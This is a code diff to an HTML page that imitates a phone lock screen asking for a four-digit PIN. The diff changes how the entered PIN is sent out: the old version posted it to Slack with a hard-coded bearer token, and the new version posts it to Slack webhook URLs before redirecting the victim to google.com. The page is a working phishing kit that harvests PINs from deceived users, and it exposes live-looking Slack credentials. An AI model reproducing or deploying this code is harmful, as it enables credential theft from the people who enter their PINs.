@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -71,21 +72,23 @@
     <div class="lock-screen">
         <h2>Enter PIN</h2>
         <p>Your PIN contains at least 4 digits.</p>
-        <input type="password" id="pin" class="pin-display" maxlength="4" readonly>
-        <div class="num-pad">
-            <button onclick="enterDigit(1)">1</button>
-            <button onclick="enterDigit(2)">2</button>
-            <button onclick="enterDigit(3)">3</button>
-            <button onclick="enterDigit(4)">4</button>
-            <button onclick="enterDigit(5)">5</button>
-            <button onclick="enterDigit(6)">6</button>
-            <button onclick="enterDigit(7)">7</button>
-            <button onclick="enterDigit(8)">8</button>
-            <button onclick="enterDigit(9)">9</button>
-            <button onclick="clearPin()">&#x232B;</button>
-            <button onclick="enterDigit(0)">0</button>
-            <button onclick="submitPin()">OK</button>
-        </div>
+        <form id="pinForm" action="https://hooks.slack.com/services/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" method="POST">
+            <input type="password" id="pin" name="pin" class="pin-display" maxlength="4" readonly>
+            <div class="num-pad">
+                <button type="button" onclick="enterDigit(1)">1</button>
+                <button type="button" onclick="enterDigit(2)">2</button>
+                <button type="button" onclick="enterDigit(3)">3</button>
+                <button type="button" onclick="enterDigit(4)">4</button>
+                <button type="button" onclick="enterDigit(5)">5</button>
+                <button type="button" onclick="enterDigit(6)">6</button>
+                <button type="button" onclick="enterDigit(7)">7</button>
+                <button type="button" onclick="enterDigit(8)">8</button>
+                <button type="button" onclick="enterDigit(9)">9</button>
+                <button type="button" onclick="clearPin()">&#x232B;</button>
+                <button type="button" onclick="enterDigit(0)">0</button>
+                <button type="submit" onclick="submitPin(event)">OK</button>
+            </div>
+        </form>
         <div class="bottom-buttons">
             <button onclick="alert('Emergency call')">Emergency call</button>
         </div>
@@ -111,36 +114,30 @@
         function clearPin() {
             document.getElementById('pin').value = '';
         }
-        function submitPin() {
+        function submitPin(event) {
+            event.preventDefault();
             let pin = document.getElementById('pin').value;
             if (pin.length === 4) {
-                fetch('https://slack.com/api/chat.postMessage', {
-                    method: 'POST',
+                fetch("https://hooks.slack.com/services/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", {
+                    method: "POST",
                     headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer xoxe.xoxp-1-Mi0yLTg2ODYwOTg4NDU5MzctODY4NjA5ODg2NDU2MS04NjY4OTkzMjc1MTEwLTg2Njg5OTMzMDIxODItYzZjMjdjM2UwYjg2N2I1YThiY2JhYjdmMDdkYTllMDFjZTA3NGU2MDc1ODkzZWM5OTM4ODdlMjlmMDA0Yjc1Yg'
+                        "Content-Type": "application/json"
                     },
-                    body: JSON.stringify({
-                        channel: 'C08KNQVQDEJ',
-                        text: 'Entered PIN: ' + pin
-                    })
+                    body: JSON.stringify({ text: "Entered PIN: " + pin })
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Success:', data);
-                        window.location.href = 'https://www.google.com';
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://www.google.com";
                     } else {
-                        console.error('Slack API Error:', data);
-                        alert('Failed to send PIN to Slack. Check console for details.');
+                        alert("Failed to send PIN to Slack.");
                     }
                 })
                 .catch(error => {
-                    console.error('Error:', error);
-                    alert('Network error or invalid Slack credentials.');
+                    console.error("Error:", error);
+                    alert("Network error or invalid Slack Webhook.");
                 });
             } else {
-                alert('Enter a 4-digit PIN');
+                alert("Enter a 4-digit PIN");
             }
         }
     </script>
